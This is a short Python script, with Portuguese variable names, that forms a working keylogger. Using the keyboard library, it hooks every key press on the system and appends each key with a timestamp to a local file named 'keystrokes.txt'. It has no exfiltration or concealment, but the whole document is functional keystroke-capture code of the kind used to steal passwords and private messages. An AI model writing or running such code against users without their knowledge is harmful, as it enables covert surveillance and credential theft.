import keyboard
from datetime import datetime

log_file = 'keystrokes.txt'

def on_key_press(event):
    datahora = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    mensagem = '[{}] {}\n'.format(datahora, event.name)

    with open(log_file, 'a') as f:
        f.write(mensagem)
        
keyboard.on_press(on_key_press)
keyboard.wait()